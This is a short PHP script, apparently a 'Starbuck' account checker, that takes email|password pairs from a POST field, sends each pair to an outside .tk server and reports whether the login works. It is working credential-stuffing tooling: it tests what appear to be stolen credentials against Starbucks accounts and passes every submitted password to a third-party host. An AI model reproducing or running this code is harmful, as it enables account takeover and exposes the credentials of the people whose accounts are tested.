<?php
// Script Starbuck Account API
// 01 Agustus 2017 [v.1]
// Powered by Cornelius Alfredo
error_reporting(0);
$api = "http://antisocialsocialclub.tk/starbuck/check.php";
	$mailpass = $_POST["mailpass"];
	$mailpass = explode("|", $mailpass);
	$mail = $mailpass [0];
	$pass = $mailpass [1];
	$request = $mail."|".$pass;
$ch = curl_init($api);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_POST, true);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'mailpass='.$request);
$alfred = curl_exec($ch);
$url = json_decode($alfred);
if($url->error == 0){
            $result['error'] = 0;
            $result['msg'] = $url->msg;
            echo json_encode($result);
            exit();
} if($url->error == 5){
            $result['error'] = -1;
            $result['msg'] = $url->msg;
            echo json_encode($result);
            exit();
} else {
            $result['error'] = 2;
            $result['msg'] = $url->msg;
            echo json_encode($result);
            exit();
}
?>
